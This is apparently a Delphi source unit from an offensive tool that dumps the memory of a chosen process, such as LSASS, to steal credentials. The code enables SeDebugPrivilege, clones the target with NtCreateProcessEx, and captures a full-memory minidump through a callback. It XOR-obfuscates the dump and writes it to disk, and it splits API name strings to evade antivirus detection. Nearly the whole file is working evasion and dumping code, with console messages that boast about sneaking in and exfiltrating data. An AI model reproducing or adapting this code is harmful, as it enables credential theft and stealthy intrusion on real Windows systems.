unit uimagehlp;


interface

uses
  Classes, SysUtils,windows,
  utils,ntdll,uxor,uadvapi32,System.NetEncoding;

const
  MiniDumpNormal         = $0000;
  {$EXTERNALSYM MiniDumpNormal}
  MiniDumpWithDataSegs   = $0001;
  {$EXTERNALSYM MiniDumpWithDataSegs}
  MiniDumpWithFullMemory = $0002;
  {$EXTERNALSYM MiniDumpWithFullMemory}
  MiniDumpWithHandleData = $0004;
  {$EXTERNALSYM MiniDumpWithHandleData}
  MiniDumpFilterMemory   = $0008;
  {$EXTERNALSYM MiniDumpFilterMemory}
  MiniDumpScanMemory     = $0010;
  {$EXTERNALSYM MiniDumpScanMemory}
  MiniDumpWithUnloadedModules            = $0020;
  {$EXTERNALSYM MiniDumpWithUnloadedModules}
  MiniDumpWithIndirectlyReferencedMemory = $0040;
  {$EXTERNALSYM MiniDumpWithIndirectlyReferencedMemory}
  MiniDumpFilterModulePaths              = $0080;
  {$EXTERNALSYM MiniDumpFilterModulePaths}
  MiniDumpWithProcessThreadData          = $0100;
  {$EXTERNALSYM MiniDumpWithProcessThreadData}
  MiniDumpWithPrivateReadWriteMemory     = $0200;
  {$EXTERNALSYM MiniDumpWithPrivateReadWriteMemory}

  type
  _MINIDUMP_TYPE = DWORD;
  {$EXTERNALSYM _MINIDUMP_TYPE}
  MINIDUMP_TYPE = _MINIDUMP_TYPE;
  {$EXTERNALSYM MINIDUMP_TYPE}
  TMinidumpType = MINIDUMP_TYPE;

  //**************************************************************

   MINIDUMP_CALLBACK_TYPE = (
    ModuleCallback, //0
            ThreadCallback,  //1
            ThreadExCallback,
            IncludeThreadCallback,
            IncludeModuleCallback,
            MemoryCallback,
            CancelCallback,
            WriteKernelMinidumpCallback,
            KernelMinidumpStatusCallback,
            RemoveMemoryCallback,
            IncludeVmRegionCallback,
            IoStartCallback, //11
            IoWriteAllCallback, //12
            IoFinishCallback,  //13
            ReadMemoryFailureCallback, //14
            SecondaryFlagsCallback, //15
            IsProcessSnapshotCallback, //16
            VmStartCallback,
            VmQueryCallback,
            VmPreReadCallback,
            VmPostReadCallback);

  PMINIDUMP_THREAD_CALLBACK = ^MINIDUMP_THREAD_CALLBACK;
  {$EXTERNALSYM PMINIDUMP_THREAD_CALLBACK}
  MINIDUMP_THREAD_CALLBACK = record
    ThreadId: ULONG;
    ThreadHandle: HANDLE;
    Context: CONTEXT;
    SizeOfContext: ULONG;
    StackBase: ULONG64;
    StackEnd: ULONG64;
  end;

  PMINIDUMP_THREAD_EX_CALLBACK = ^MINIDUMP_THREAD_EX_CALLBACK;
   {$EXTERNALSYM PMINIDUMP_THREAD_EX_CALLBACK}
   MINIDUMP_THREAD_EX_CALLBACK = record
     ThreadId: ULONG;
     ThreadHandle: HANDLE;
     Context: CONTEXT;
     SizeOfContext: ULONG;
     StackBase: ULONG64;
     StackEnd: ULONG64;
     BackingStoreBase: ULONG64;
     BackingStoreEnd: ULONG64;
   end;

   PMINIDUMP_MODULE_CALLBACK = ^MINIDUMP_MODULE_CALLBACK;
     {$EXTERNALSYM PMINIDUMP_MODULE_CALLBACK}
     MINIDUMP_MODULE_CALLBACK = record
       FullPath: PWCHAR;
       BaseOfImage: ULONG64;
       SizeOfImage: ULONG;
       CheckSum: ULONG;
       TimeDateStamp: ULONG;
       VersionInfo: VS_FIXEDFILEINFO;
       CvRecord: PVOID;
       SizeOfCvRecord: ULONG;
       MiscRecord: PVOID;
       SizeOfMiscRecord: ULONG;
     end;

     PMINIDUMP_INCLUDE_THREAD_CALLBACK = ^MINIDUMP_INCLUDE_THREAD_CALLBACK;
       {$EXTERNALSYM PMINIDUMP_INCLUDE_THREAD_CALLBACK}
       MINIDUMP_INCLUDE_THREAD_CALLBACK = record
         ThreadId: ULONG;
       end;

       PMINIDUMP_INCLUDE_MODULE_CALLBACK = ^MINIDUMP_INCLUDE_MODULE_CALLBACK;
         {$EXTERNALSYM PMINIDUMP_INCLUDE_MODULE_CALLBACK}
         MINIDUMP_INCLUDE_MODULE_CALLBACK = record
           BaseOfImage: ULONG64;
         end;

 type MINIDUMP_IO_CALLBACK =record
   Handle:HANDLE;
   Offset:ULONG64;
   Buffer:PVOID;
   BufferBytes:ULONG;
end;
 PMINIDUMP_IO_CALLBACK=^MINIDUMP_IO_CALLBACK;

 //https://github.com/b4rtik/SharpMiniDump/blob/master/SharpMiniDump/Natives.cs
  MINIDUMP_CALLBACK_INPUT = packed record
      ProcessId: ULONG;
      ProcessHandle: HANDLE;
      CallbackType: ULONG; //4+8
      case Integer of
        0: (Thread: MINIDUMP_THREAD_CALLBACK);
        1: (ThreadEx: MINIDUMP_THREAD_EX_CALLBACK);
        2: (Module: MINIDUMP_MODULE_CALLBACK);
        3: (IncludeThread: MINIDUMP_INCLUDE_THREAD_CALLBACK);
        4: (IncludeModule: MINIDUMP_INCLUDE_MODULE_CALLBACK);
        5: (Io:MINIDUMP_IO_CALLBACK);
    end;
  PMINIDUMP_CALLBACK_INPUT = ^MINIDUMP_CALLBACK_INPUT;

  PMINIDUMP_MEMORY_INFO = ^MINIDUMP_MEMORY_INFO;
  MINIDUMP_MEMORY_INFO =record
     BaseAddress:ULONG64;
     AllocationBase:ULONG64;
     AllocationProtect:ULONG32;
     __alignment1:ULONG32;
     RegionSize:ULONG64;
     State:ULONG32;
     Protect:ULONG32;
     Type_:ULONG32;
     __alignment2:ULONG32;
  end;


  PMINIDUMP_CALLBACK_OUTPUT = ^MINIDUMP_CALLBACK_OUTPUT;

  MINIDUMP_CALLBACK_OUTPUT =record
  Status:HRESULT;
  end;

  MINIDUMP_CALLBACK_ROUTINE = function(CallbackParam: PVOID; CallbackInput: PMINIDUMP_CALLBACK_INPUT;CallbackOutput: PMINIDUMP_CALLBACK_OUTPUT): BOOL; stdcall;

  type MINIDUMP_CALLBACK_INFORMATION =record
  CallbackRoutine:MINIDUMP_CALLBACK_ROUTINE;
  CallbackParam:PVOID;
  end;
  PMINIDUMP_CALLBACK_INFORMATION=^MINIDUMP_CALLBACK_INFORMATION;

{$EXTERNALSYM MiniDumpWriteDump}


function log(s:string):string;


function dumpprocess(pid:dword):boolean;

implementation

 var
 destination:LPVOID;
 source:LPVOID;
 bufferSize:DWORD;

var
MiniDumpWriteDump:function (hProcess: HANDLE; ProcessId: DWORD; hFile: HANDLE; DumpType: MINIDUMP_TYPE; ExceptionParam: pointer; UserStreamParam: pointer; CallbackParam: pointer): BOOL; stdcall;
// proto NtCreateProcessEx
piciolla:function(ProcessHandle : PHANDLE;
                                   DesiredAccess: ACCESS_MASK;
                                   ObjectAttributes: POBJECT_ATTRIBUTES;
                                   InheritFromProcessHandle: DWORD;
                                   InheritHandles: DWORD;
                                   SectionHandle: DWORD;
                                   DebugPort: DWORD;
                                   ExceptionPort: DWORD;
                                   dwSaferFlags: DWORD): NTSTATUS; stdcall;


dumpBuffer:LPVOID;
bytesRead:DWORD = 0;
pip,size:DWORD;

function aNtCreateProcessEx(ProcessHandle : PHANDLE;
                                        DesiredAccess: ACCESS_MASK;
                                        ObjectAttributes: POBJECT_ATTRIBUTES;
                                        InheritFromProcessHandle: DWORD;
                                        InheritHandles: DWORD;
                                        SectionHandle: DWORD;
                                        DebugPort: DWORD;
                                        ExceptionPort: DWORD;
                                        dwSaferFlags: DWORD): NTSTATUS; stdcall; external 'ntdll.dll';

function log(s:string):string;
begin
  writeln('[+] '+s);
end;


function minidumpCallback(CallbackParam: PVOID; CallbackInput: PMINIDUMP_CALLBACK_INPUT;CallbackOutput: PMINIDUMP_CALLBACK_OUTPUT): BOOL; stdcall;

begin
destination:=nil;
source:=nil;
bufferSize:=0;

case callbackInput^.CallbackType of
    uint(MINIDUMP_CALLBACK_TYPE.IoStartCallback):
                        begin
			                   callbackOutput^.Status := S_FALSE;
                        end;

    uint(MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback):
                        begin
                         callbackOutput^.Status := S_OK;
       			             source := callbackInput^.Io.Buffer;
                         //pip:=HeapSize(GetProcessHeap(),0,pointer(CallbackParam));
                         //size:=size+ CallbackInput^.Io.BufferBytes; //+CallbackInput.Io.Offset
       			             destination := pointer(nativeuint(dumpBuffer) + callbackInput^.Io.Offset);
                         bufferSize := callbackInput^.Io.BufferBytes;
                         //writeln(bufferSize);
			                   bytesRead := bytesread + bufferSize;
                         CopyMemory(destination, source, bufferSize);
                        end;

    uint(MINIDUMP_CALLBACK_TYPE.IoFinishCallback):
                        begin
    			               callbackOutput^.Status := S_OK;
                        end;

    else result:=true;

end; //case

result:=true;
end;


function EnableDebugPriv(priv:string):boolean;
var
  NewState,prev: TTokenPrivileges;
  luid: TLargeInteger;
  hToken: THandle;
  ReturnLength: DWord;
begin
result:=false;
  if OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, hToken) then
  begin
   if LookupPrivilegeValue(nil, PChar(priv), luid) then
   begin
    NewState.PrivilegeCount:= 1;
    NewState.Privileges[0].Luid := luid;
    NewState.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
    fillchar(prev,sizeof(prev),0);
    if AdjustTokenPrivileges(hToken, False, NewState, SizeOf(TTokenPrivileges), prev, ReturnLength) then
    begin
    result:=true;

      if GetLastError = ERROR_NOT_ALL_ASSIGNED then
      result:=false;
    end;
   end;
    CloseHandle(hToken);
  end;
end;



function dumpprocess(pid:dword):boolean;
var
  status:ntstatus;
  s,s2:string;
  clone,processHandle,hfile:thandle;
  callbackInfo:MINIDUMP_CALLBACK_INFORMATION;
  bytes: TBytes;
lib,lib2:int64;
msRecInfo: TMemoryStream;
begin
EnableDebugPriv('SeDebugPrivilege');



//impersonatepid(pid);
log('the fox sneaks into the system!');
lib:=0;
lib:=loadlibrary(pchar(sysdir+'\dbghelp.dll'));
lib2:=0;
lib2:=loadlibrary(pchar(sysdir+'\ntdll.dll'));

if lib<=0 then
  begin
  raise exception.Create  ('could not loadlibrary:'+inttostr(getlasterror));
  exit;
  end;

//peppe:=getProcaddress(lib2,'NtQuerySystemInformation');

if lib2<=0 then
  begin
  raise exception.Create  ('could not ntcreateprocessex:'+inttostr(getlasterror));
  exit;
  end;
//
processHandle:=thandle(-1);
processHandle := OpenProcess(PROCESS_CREATE_PROCESS, false, PID);
writeln('[+] Process Handle: '+processHandle.ToString);
if processHandle<>thandle(-1) then
   begin
   ZeroMemory(@clone,sizeof(clone));
   writeln('[+] PID: '+inttostr(pid));
   s:='N'+'t'+'C'+'r'+'e'+'a'+'t'+'e';
   s2:='P'+'r'+'o'+'c'+'e'+'s'+'s'+'E'+'x';
   //Writeln((s));
   piciolla:= getProcAddress(lib2,'NtCreateProcessEx');
   status := piciolla(@clone,PROCESS_ALL_ACCESS,nil,processHandle,0,0,0,0,0);
    writeln(clone);
     if clone>0 then
      begin
       write('[+] Memory Cloned');
       write(' with Process PID: ');
       writeln(clone);
      	ZeroMemory(@callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
      	callbackInfo.CallbackRoutine := minidumpCallback;
      	callbackInfo.CallbackParam := nil;
      //
      //readln(s);
      dumpbuffer:=HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 512);
      writeln('[+] the fox has eaten the grapes and is blurring the tracks');
      MiniDumpWriteDump:=getProcAddress(lib,'MiniDumpWriteDump');
      writeln('[+] Memory Dumped!');
      result := MiniDumpWriteDump(clone, 0, 0, MiniDumpWithFullMemory, nil, nil, @callbackInfo);
      if result=false then result := MiniDumpWriteDump(clone, pid, 0, MiniDumpWithFullMemory, nil, nil, @callbackInfo);
      if result=false then log('MiniDumpWriteDump failed,'+inttohex(getlasterror,sizeof(dword)));
      xorbytes(dumpbuffer,bytesread);
      hFile := CreateFile(pchar(inttostr(pid)+'.dmp.obfusco'), GENERIC_ALL, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
      writeln('[+] Esfiltrating data from: '+inttostr(pid)); //+ ' written - XORkeyToDecode=FF');
      //writeln('Esfiltrating dump...');
      writefile(hfile,dumpBuffer^,bytesRead ,bytesRead,nil);
      closehandle(hfile);
      heapfree(GetProcessHeap(),0,dumpbuffer);
      //readln(s);
      write('[?] Used memory: ');
      writeln(size);
      end else log('[!] NtCreateProcessEx failed');
   closehandle(processHandle );
   TerminateProcess(clone,0);
   closehandle(clone );
   end
   else log('OpenProcess failed');
 end;

 begin
  pip:=0;size:=0;


 end.

